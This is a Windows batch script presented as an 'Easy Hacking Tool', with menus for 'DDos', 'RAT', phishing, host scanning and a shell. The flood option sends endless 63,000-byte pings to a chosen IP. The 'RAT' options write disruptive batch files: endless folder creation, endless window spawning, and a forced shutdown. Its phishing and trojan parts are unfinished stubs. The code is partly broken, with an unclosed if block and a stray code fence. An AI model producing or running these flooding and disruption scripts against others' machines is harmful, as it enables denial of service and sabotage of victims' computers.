@echo off

cls
setlocal enabledelayedexpansion

echo starting server...
timeout /t 2 /nobreak >nul
cls
echo setting MS-DOS subsystem...

for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /c:"IPv4 Address"') do set "ip=%%a"
set "ip=%ip:~1%"

timeout /t 3 /nobreak >nul

cls
echo running file \EHT.bat\UserSession
timeout /t 1 /nobreak >nul
cls
echo starting EHT In %USERNAME%'s session
timeout /t 1 /nobreak >nul
cls



echo logging In
timeout /t 1 /nobreak >nul
cls

:start
color a 
cls

echo Hostname: %Computername%
echo Hello %USERNAME%, Welcome to Easy Hacking Tool
echo Version 1.3 Patch 1.3
echo.
echo       _______      ___   ___     __________
echo      / _____/     /  /  /  /    /___   ___/  
echo     / /___       /  /__/  /        /  /
echo    /  ___/      /  ___   /        /  /
echo   / /____      /  /  /  /        /  /
echo  /______/asy  /__/  /__/acking  /__/ool
echo.
echo.
echo.
echo.
echo 	Auswahl:
echo.
echo		1) DDos Attack
echo		2) RAT
echo		3) Phishing Website
echo		4) Host discovery
echo		5) \%username%\ CommandPrompt
echo		6) Hacking-DP

echo.
set /p userInput=EHT.bat\: 




if "%userInput%"=="1" goto DDos

if "%userInput%"=="2" goto RAT

if "%userInput%"=="3" goto Phishing

if "%userInput%"=="4" goto Host_discovery

if "%userInput%"=="5" goto CMD 

if "%userInput%"=="exit" exit 

if "%userInput%"=="changelog" changelog.txt

if "%userInput%"=="6" goto HS

if "%userInput%"=="settings" goto settings


cls
echo error 404 Not found
timeout /t 5 /nobreak >nul
goto start

:DDos


color 0B

:: Datenbank erstellen, falls sie nicht existiert
if not exist "geraete.txt" (
    echo Ip_list;Name=IP>geraete.txt
    echo me=%ip%>>geraete.txt
)

::start
cls
echo ==================================
echo            DDos-Tool
echo ==================================
echo.
echo 	0 - Ping Ip
echo 	1 - Ping Device
echo 	2 - Add Device
echo 	3 - Edit Database
echo 	4 - Show Database
echo 	5 - Delete Device
echo.
echo.
set /p "wahl=EHT.bat\DDos\: "

if "%wahl%"=="0" goto ping
if "%wahl%"=="1" goto testen
if "%wahl%"=="2" goto hinzufuegen
if "%wahl%"=="3" goto bearbeiten
if "%wahl%"=="4" goto anzeigen
if "%wahl%"=="5" goto loeschen
if "%wahl%"=="exit" goto start


echo.
echo unknown command!
pause
goto DDos


:ping
cls
set /p "tar_IP=EHT.bat\DDos\PingIp\: "
echo pinging %tar_IP%
ping %tar_IP% -t -l 63000
pause
goto DDos

:: ==================================
:: GERAET TESTEN
:: ==================================
:testen
cls
echo ==================================
echo            Ping Device
echo ==================================
echo.

set /p "geraet=Target: "

set "IP="

for /f "tokens=1,2 delims==" %%A in (geraete.txt) do (
    if /i "%%A"=="%geraet%" set "IP=%%B"
)

if not defined IP (
    echo.
    echo Target "%geraet%" was not found!
    pause
    goto start
)

echo.
echo Found:
echo %geraet% = %IP%
echo.
echo Pinging %IP%...
echo.

ping %Ip% -t -l 63000

echo.
pause
goto DDos


:: ==================================
:: GERAET HINZUFUEGEN
:: ==================================
:hinzufuegen
cls
echo ==================================
echo            NEW DEVICE
echo ==================================
echo.

set /p "geraet=Name : "
set /p "IP=IP-Adress : "

echo %geraet%=%IP%>>geraete.txt

echo.
echo Device added sucessfully:
echo %geraet% = %IP%
echo.

pause
goto DDos


:: ==================================
:: DATENBANK BEARBEITEN
:: ==================================
:bearbeiten
cls
echo ==================================
echo          EDIT DATABASE
echo ==================================
echo.
echo Die Datenbank wird im Editor geoeffnet.
echo.
echo Format:
echo geraet=IP-Adresse
echo.
pause

notepad geraete.txt

goto DDos


:: ==================================
:: DATENBANK ANZEIGEN
:: ==================================
:anzeigen
cls
echo ==================================
echo          DEVICE-DATABASE
echo ==================================
echo.

type geraete.txt

echo.
echo ==================================
pause
goto DDos
```
:loeschen
cls
echo ==================================
echo          DELETE DEVICE
echo ==================================
echo.

set /p "geraet=What device should be deleted: "

set "gefunden="

(
    for /f "tokens=1,* delims==" %%A in (geraete.txt) do (
        if /i "%%A"=="%geraet%" (
            set "gefunden=1"
        ) else (
            echo %%A=%%B
        )
    )
) > geraete_temp.txt

if not defined gefunden (
    del geraete_temp.txt
    echo.
    echo Device "%geraet%" was not found!
    pause
    goto DDos
)

move /y geraete_temp.txt geraete.txt >nul

echo.
echo Device "%geraet%" was deleted.
echo.

pause
goto DDos


	
:RAT
cls
color c
echo ==================================
echo             RAT-TOOL
echo ==================================
echo.
echo.
echo 	1) Remote Admin Trojan Noch nicht in Funktion
echo 	2) Folder Spawmer
echo 	3) Error Spawmer
echo 	4) Herunterfahren
echo.
set /p RATAuswahl=EHT.bat\RAT\:

if "%RATAuswahl%"=="1" (
 cls
 echo In Developtment

pause
goto START

if "%RATAuswahl%"=="2" (
	cls
	echo [*] Erstelle Ordner...
	echo.
	if not exist RAT mkdir RAT
	cd RAT
	timeout /t 4 /nobreak >nul
	echo [*] Erstelle Folder Spawmer...
	echo.
	(
		echo @echo off
		echo :loop
		echo mkdir %%random%%
		echo goto loop
	) > FolderSpawmer.bat
	timeout /t 4 /nobreak >nul
	echo Fertig! 
	pause
)

if "%RATAuswahl%"=="3" (
	cls
	echo [*] Erstelle Ordner...
	echo.
	if not exist RAT mkdir RAT
	cd RAT
	timeout /t 4 /nobreak >nul
	echo [*] Erstelle Error Spawmer...
	echo.
	
	echo @echo off >> Errorspawmer.bat
	echo :loop1 >> Errorspawmer.bat
	echo start "HAHAH" "%USERPROFILE%\OneDrive\Desktop\New\RAT\HAHAH" >> Errorspawmer.bat
	echo goto loop1 >> Errorspawmer.bat

	
	timeout /t 4 /nobreak >nul
	echo.
	echo Fertig! 
	pause
)

if "%RATAuswahl%"=="4" (
	cls
	echo [*] Erstelle Ordner
	echo.
	timeout /t 4 /nobreak >nul
	if not exist RAT mkdir RAT
	cd RAT
	echo [*] Erstelle RAT
	echo.
	
	echo @echo off >> Shutdown.bat
	echo shutdown -s -t 10 -c "HAHAH" >> Shutdown.bat
	timeout /t 4 /nobreak >nul
	
	pause
)
if "%RATAuswahl%"=="back" goto start

exit


:Phishing
cls
color d
echo ==================================
echo		   PHISHING-TOOL
echo ==================================
echo.
echo Was sind die Vorlieben deines Ziels:
echo.
echo 	1) Snapchat
echo.
echo 	2) Youtube
echo.
echo 	3) Instagram
echo.
echo 	4) Google
echo.
echo 	5) Github
echo.
echo 	6) ChatGPT
echo.
set /p Auswahl=EHT.bat\Phishing\: 
if "%Auswahl%"=="1" (
    echo Bereite Server vor...
    timeout /t 3 /nobreak >nul
    echo.
    
    echo Setze PHP Server...
    timeout /t 7 /nobreak >nul
    echo.
    
    echo Erstelle Webseite...
    timeout /t 4 /nobreak >nul
    echo.
    
    echo In bearbeitung!
	
	pause
if "%Auswahl%"=="back" goto start
	exit
)

:Host_discovery

@echo off
color b
cls
echo ==================================
echo		   IP-SCAN-Tool
echo ==================================


:: Start-IP definieren (z. B. 10.95.231.0)
set IP_BASE=10.95.231.
set START=0
set END=255

:: Aktivieren von Delayed Expansion
setlocal enabledelayedexpansion

:: Schleife durch IP-Bereich (0 bis 255)
for /L %%i in (%START%,1,%END%) do (
    set /a IP_LAST=%%i
    set IP=!IP_BASE!!IP_LAST!
    echo Scanne !IP! ...
    
    :: Ping mit 1 Paket (-n 1) und Timeout 300 ms (-w 300)
    ping -n 2 -w 1000 !IP! >nul
    
    :: Überprüfe den errorlevel
    if !errorlevel! equ 0 (
        echo !IP! ist **ONLINE** 
    ) else (
        echo !IP! ist **OFFLINE** 
    )
)

echo Scan abgeschlossen!
pause


:CMD 
cls
color f
cd..
cd..

cmd 

:HS 
cd..
cd..
cd..
cd..
cd..
cd..
cd..
cls
color a
echo Activate fullscreen for better visuals (F11) 
pause
cls

tree